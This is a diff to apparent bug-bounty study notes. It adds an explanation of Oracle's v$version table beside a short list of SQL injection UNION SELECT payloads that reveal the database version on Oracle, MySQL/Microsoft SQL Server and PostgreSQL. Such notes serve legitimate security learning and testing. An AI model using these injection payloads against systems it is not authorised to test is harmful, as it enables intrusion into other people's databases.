@@ -12,7 +12,7 @@ This is all about web &amp; bugbounty
 
 
 (3) Output the version of the database => 
-  i) ' UNION SELECT banner, NULL from v$version-- (Oracle)
+  i) ' UNION SELECT banner, NULL from v$version-- (Oracle) --> The banner displays the database release and version number AND The version information is stored in a table called v$version.
   ii) ' UNION SELECT @@version, NULL# (Microsoft ,MySql)
   iii)' UNION SELECT version(), NULL-- (postgresql)
   
